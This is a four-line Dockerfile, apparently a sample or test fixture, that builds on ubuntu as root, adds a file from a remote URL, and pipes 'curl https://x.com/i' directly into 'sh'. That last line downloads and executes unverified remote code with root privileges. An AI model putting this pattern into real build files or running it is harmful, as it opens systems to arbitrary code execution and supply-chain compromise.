FROM ubuntu
USER root
ADD https://x.com/i /tmp/i
RUN curl https://x.com/i | sh
